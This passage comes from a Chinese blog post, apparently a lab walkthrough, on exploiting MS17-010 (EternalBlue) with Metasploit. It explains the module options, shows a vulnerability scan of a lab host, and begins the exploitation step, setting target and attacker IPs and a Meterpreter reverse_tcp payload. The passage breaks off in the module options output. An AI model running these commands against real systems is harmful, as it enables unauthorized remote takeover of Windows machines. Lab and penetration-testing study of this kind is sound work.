+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;8&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; target: Windows &lt;span class="m"&gt;10&lt;/span&gt; Pro . . . .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;9&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; target: Windows &lt;span class="m"&gt;10&lt;/span&gt; Enterprise Evaluation . . . .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;10&lt;/span&gt; exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;11&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; target: Automatic . . . .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;12&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; target: PowerShell . . . .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;13&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; target: Native upload . . . .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;14&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; target: MOF upload . . . .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;15&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; AKA: ETERNALSYNERGY . . . .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;16&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; AKA: ETERNALROMANCE . . . .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;17&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; AKA: ETERNALCHAMPION . . . .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;18&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; AKA: ETERNALBLUE . . . .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;19&lt;/span&gt; auxiliary/admin/smb/ms17_010_command 2017-03-14 normal No MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;20&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; AKA: ETERNALSYNERGY . . . .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;21&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; AKA: ETERNALROMANCE . . . .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;22&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; AKA: ETERNALCHAMPION . . . .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;23&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; AKA: ETERNALBLUE . . . .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;24&lt;/span&gt; auxiliary/scanner/smb/smb_ms17_010 . normal No MS17-010 SMB RCE Detection
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;25&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; AKA: DOUBLEPULSAR . . . .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;26&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; AKA: ETERNALBLUE . . . .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;27&lt;/span&gt; exploit/windows/smb/smb_doublepulsar_rce 2017-04-14 great Yes SMB DOUBLEPULSAR Remote Code Execution
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;28&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; target: Execute payload &lt;span class="o"&gt;(&lt;/span&gt;x64&lt;span class="o"&gt;)&lt;/span&gt; . . . .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;29&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; target: Neutralize implant . . . .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Interact with a module by name or index. For example info 29, use &lt;span class="m"&gt;29&lt;/span&gt; or use exploit/windows/smb/smb_doublepulsar_rce
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;After interacting with a module you can manually &lt;span class="nb"&gt;set&lt;/span&gt; a TARGET with &lt;span class="nb"&gt;set&lt;/span&gt; TARGET &lt;span class="s1"&gt;&amp;#39;Neutralize implant&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 &amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;以上为metasploit中的ms17-010（永恒之蓝）模块。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;MS17-010 (永恒之蓝) 漏洞利用套件详解&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;主要攻击模块&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;a. exploit/windows/smb/ms17_010_eternalblue (索引 0-9)&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;介绍&lt;/strong&gt;： 这是最著名、最直接的攻击模块。它利用SMBv1协议的内核级漏洞，通过越界写入破坏内核内存池，实现远程代码执行。攻击过程直接在内核态进行，极其“暴力”。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;漏洞类型&lt;/strong&gt;： SMB协议远程内核池破坏漏洞。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;利用方式&lt;/strong&gt;： 发送特制SMBv1数据包触发内核内存破坏。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;目标系统&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;Windows 7 / Server 2008 R2（主要目标）&lt;/li&gt;
+&lt;li&gt;Windows 8/8.1 / Server 2012&lt;/li&gt;
+&lt;li&gt;Windows 10 Pro/Enterprise&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;特点&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;无需任何身份验证&lt;/strong&gt;。&lt;/li&gt;
+&lt;li&gt;对Windows 7/2008 R2成功率较高。&lt;/li&gt;
+&lt;li&gt;操作风险高：由于直接操作内核内存，若堆喷射失败，极易导致目标系统&lt;strong&gt;蓝屏死机(BSOD)&lt;/strong&gt;。&lt;/li&gt;
+&lt;li&gt;依赖目标开启445端口。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;关键参数&lt;/strong&gt;： &lt;code&gt;GroomAllocations&lt;/code&gt;。调整此内存分配参数有时能在攻击失败时提高成功率。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;b. exploit/windows/smb/ms17_010_psexec (索引 10-18)&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;介绍&lt;/strong&gt;： 此模块不一定需要凭证。它主要利用&lt;strong&gt;EternalRomance&lt;/strong&gt;等漏洞链，通过SMB命名管道中的类型混淆漏洞进行攻击。相比EternalBlue更稳定，是攻击更新系统（如Win10）的首选。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;技术集合&lt;/strong&gt;： 融合了多个SMB漏洞，包括EternalRomance、EternalSynergy、EternalChampion。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;目标类型&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;PowerShell&lt;/strong&gt;： 通过PowerShell在内存中执行载荷。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Native upload&lt;/strong&gt;： 直接上传可执行文件执行。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;MOF upload&lt;/strong&gt;： 使用WMI托管对象格式执行。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;优点&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;比EternalBlue&lt;strong&gt;更稳定&lt;/strong&gt;，几乎不会导致蓝屏。&lt;/li&gt;
+&lt;li&gt;支持多种载荷传输和执行方式。&lt;/li&gt;
+&lt;li&gt;如果拥有有效的SMB凭证（即使是普通用户），成功率接近100%。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;辅助模块&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;a. auxiliary/scanner/smb/smb_ms17_010 (索引 24-26)&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;介绍&lt;/strong&gt;： &lt;strong&gt;攻击前必备的侦察模块&lt;/strong&gt;。用于安全地检测目标主机是否存在MS17-010漏洞，并检查是否已被植入DoublePulsar后门。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;检测目标是否存在MS17-010漏洞。&lt;/li&gt;
+&lt;li&gt;检测目标是否已感染DoublePulsar后门。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;输出解读&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;VULNERABLE&lt;/code&gt;： 目标存在漏洞，可尝试攻击。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;DoublePulsar detected&lt;/code&gt;： 目标已被攻破，内存中驻留有后门。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;特点&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;非入侵性，仅用于信息收集。&lt;/li&gt;
+&lt;li&gt;支持扫描整个网段（&lt;code&gt;set RHOSTS 192.168.1.0/24&lt;/code&gt;）。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;b. auxiliary/admin/smb/ms17_010_command (索引 19-23)&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;介绍&lt;/strong&gt;： 一个轻量级的命令执行模块。不返回交互式Shell，仅执行单条系统命令并返回结果。适用于快速、隐蔽的任务。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;功能&lt;/strong&gt;： 在已确认存在漏洞或已被控的系统上执行命令。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;用途&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;后渗透阶段快速执行命令（如&lt;code&gt;whoami&lt;/code&gt;、添加用户）。&lt;/li&gt;
+&lt;li&gt;在不建立持久连接的情况下进行操作。&lt;/li&gt;
+&lt;li&gt;同样支持EternalRomance等多种利用方式。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;后门利用模块&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;exploit/windows/smb/smb_doublepulsar_rce (索引 27-29)&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;DoublePulsar是什么&lt;/strong&gt;： 一个隐蔽的、无文件落地的内存SMB后门，通常由EternalBlue攻击成功后植入。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;核心功能&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Execute payload&lt;/strong&gt;： 若发现目标已存在DoublePulsar后门，可直接通过此后门注入DLL或执行代码，&lt;strong&gt;无需再次触发原始漏洞&lt;/strong&gt;。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Neutralize implant&lt;/strong&gt;： 在渗透测试结束后，专业地&lt;strong&gt;清除&lt;/strong&gt;内存中的后门痕迹。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;目标选项&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;注入载荷&lt;/strong&gt;： 利用现有后门执行代码。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;清除后门&lt;/strong&gt;： 卸载DoublePulsar植入物。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;高级配置选项（通用）&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;这些参数在多数相关模块中通用：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;&lt;code&gt;RHOST&lt;/code&gt; / &lt;code&gt;RHOSTS&lt;/code&gt;&lt;/strong&gt;： 目标IP地址或IP范围（如&lt;code&gt;192.168.1.10&lt;/code&gt;或&lt;code&gt;192.168.1.0/24&lt;/code&gt;）。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;&lt;code&gt;RPORT&lt;/code&gt;&lt;/strong&gt;： SMB服务端口，默认为&lt;code&gt;445&lt;/code&gt;。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;&lt;code&gt;SMBUser&lt;/code&gt; / &lt;code&gt;SMBPass&lt;/code&gt;&lt;/strong&gt;： SMB用户名和密码（对于&lt;code&gt;psexec&lt;/code&gt;模块尤其重要）。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;&lt;code&gt;VERIFY_ARCH&lt;/code&gt;&lt;/strong&gt;： 是否验证目标系统架构（64位/32位）。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;&lt;code&gt;VERIFY_TARGET&lt;/code&gt;&lt;/strong&gt;： 是否验证目标操作系统版本。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;&lt;code&gt;GroomAllocations&lt;/code&gt;&lt;/strong&gt;： &lt;strong&gt;(EternalBlue专用)&lt;/strong&gt; 调整初始内存分配请求的数量，以影响内核内存布局。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id="三探测目标主机"&gt;三、探测目标主机
+&lt;/h4&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;span class="lnt"&gt;5
+&lt;/span&gt;&lt;span class="lnt"&gt;6
+&lt;/span&gt;&lt;span class="lnt"&gt;7
+&lt;/span&gt;&lt;span class="lnt"&gt;8
+&lt;/span&gt;&lt;span class="lnt"&gt;9
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 &amp;gt; use &lt;span class="m"&gt;24&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 auxiliary&lt;span class="o"&gt;(&lt;/span&gt;scanner/smb/smb_ms17_010&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; rhost 10.0.0.17
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;rhost&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; 10.0.0.17
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 auxiliary&lt;span class="o"&gt;(&lt;/span&gt;scanner/smb/smb_ms17_010&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; run
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Host is likely VULNERABLE to MS17-010! - Windows &lt;span class="m"&gt;7&lt;/span&gt; Enterprise &lt;span class="m"&gt;7600&lt;/span&gt; x64 &lt;span class="o"&gt;(&lt;/span&gt;64-bit&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.17/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator &lt;span class="s1"&gt;&amp;#39;+&amp;#39;&lt;/span&gt; and &lt;span class="s1"&gt;&amp;#39;?&amp;#39;&lt;/span&gt; was replaced with &lt;span class="s1"&gt;&amp;#39;*&amp;#39;&lt;/span&gt; in regular expression
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Scanned &lt;span class="m"&gt;1&lt;/span&gt; of &lt;span class="m"&gt;1&lt;/span&gt; hosts &lt;span class="o"&gt;(&lt;/span&gt;100% &lt;span class="nb"&gt;complete&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Auxiliary module execution completed
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 auxiliary&lt;span class="o"&gt;(&lt;/span&gt;scanner/smb/smb_ms17_010&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;关键信息：&lt;code&gt;Host is likely VULNERABLE to MS17-010! - Windows 7 Enterprise 7600 x64 (64-bit)&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id="四漏洞利用"&gt;四、漏洞利用
+&lt;/h4&gt;&lt;p&gt;切换&lt;code&gt;exploit&lt;/code&gt;模块 -&amp;gt; 设置靶机IP -&amp;gt; 设置攻击机IP -&amp;gt; 设置载荷 -&amp;gt; 检察配置信息 -&amp;gt; &lt;code&gt;run&lt;/code&gt; -&amp;gt; 权限验证&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;span class="lnt"&gt;21
+&lt;/span&gt;&lt;span class="lnt"&gt;22
+&lt;/span&gt;&lt;span class="lnt"&gt;23
+&lt;/span&gt;&lt;span class="lnt"&gt;24
+&lt;/span&gt;&lt;span class="lnt"&gt;25
+&lt;/span&gt;&lt;span class="lnt"&gt;26
+&lt;/span&gt;&lt;span class="lnt"&gt;27
+&lt;/span&gt;&lt;span class="lnt"&gt;28
+&lt;/span&gt;&lt;span class="lnt"&gt;29
+&lt;/span&gt;&lt;span class="lnt"&gt;30
+&lt;/span&gt;&lt;span class="lnt"&gt;31
+&lt;/span&gt;&lt;span class="lnt"&gt;32
+&lt;/span&gt;&lt;span class="lnt"&gt;33
+&lt;/span&gt;&lt;span class="lnt"&gt;34
+&lt;/span&gt;&lt;span class="lnt"&gt;35
+&lt;/span&gt;&lt;span class="lnt"&gt;36
+&lt;/span&gt;&lt;span class="lnt"&gt;37
+&lt;/span&gt;&lt;span class="lnt"&gt;38
+&lt;/span&gt;&lt;span class="lnt"&gt;39
+&lt;/span&gt;&lt;span class="lnt"&gt;40
+&lt;/span&gt;&lt;span class="lnt"&gt;41
+&lt;/span&gt;&lt;span class="lnt"&gt;42
+&lt;/span&gt;&lt;span class="lnt"&gt;43
+&lt;/span&gt;&lt;span class="lnt"&gt;44
+&lt;/span&gt;&lt;span class="lnt"&gt;45
+&lt;/span&gt;&lt;span class="lnt"&gt;46
+&lt;/span&gt;&lt;span class="lnt"&gt;47
+&lt;/span&gt;&lt;span class="lnt"&gt;48
+&lt;/span&gt;&lt;span class="lnt"&gt;49
+&lt;/span&gt;&lt;span class="lnt"&gt;50
+&lt;/span&gt;&lt;span class="lnt"&gt;51
+&lt;/span&gt;&lt;span class="lnt"&gt;52
+&lt;/span&gt;&lt;span class="lnt"&gt;53
+&lt;/span&gt;&lt;span class="lnt"&gt;54
+&lt;/span&gt;&lt;span class="lnt"&gt;55
+&lt;/span&gt;&lt;span class="lnt"&gt;56
+&lt;/span&gt;&lt;span class="lnt"&gt;57
+&lt;/span&gt;&lt;span class="lnt"&gt;58
+&lt;/span&gt;&lt;span class="lnt"&gt;59
+&lt;/span&gt;&lt;span class="lnt"&gt;60
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 auxiliary&lt;span class="o"&gt;(&lt;/span&gt;scanner/smb/smb_ms17_010&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; use &lt;span class="m"&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Using configured payload windows/x64/meterpreter/reverse_tcp
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/smb/ms17_010_eternalblue&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; rhost 10.0.0.17
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;rhost&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; 10.0.0.17
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/smb/ms17_010_eternalblue&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; lhost 10.0.0.223
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;lhost&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; 10.0.0.223
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/smb/ms17_010_eternalblue&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; payload windows/x64/meterpreter/reverse_tcp
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; windows/x64/meterpreter/reverse_tcp
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/smb/ms17_010_eternalblue&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; show options
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Module options &lt;span class="o"&gt;(&lt;/span&gt;exploit/windows/smb/ms17_010_eternalblue&lt;span class="o"&gt;)&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Name Current Setting Required Description
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ---- --------------- -------- -----------
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; RHOSTS 10.0.0.17 yes The target host&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt;, see https:
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; //docs.metasploit.com/docs/usi
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ng-metasploit/basics/using-met
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; asploit.html
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; RPORT &lt;span class="m"&gt;445&lt;/span&gt; yes The target port &lt;span class="o"&gt;(&lt;/span&gt;TCP&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; SMBDomain no &lt;span class="o"&gt;(&lt;/span&gt;Optional&lt;span class="o"&gt;)&lt;/span&gt; The Windows domain
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; to use &lt;span class="k"&gt;for&lt;/span&gt; authentication. Onl
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; y affects Windows Server &lt;span class="m"&gt;2008&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; R2, Windows 7, Windows Embedde
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; d Standard &lt;span class="m"&gt;7&lt;/span&gt; target machines.
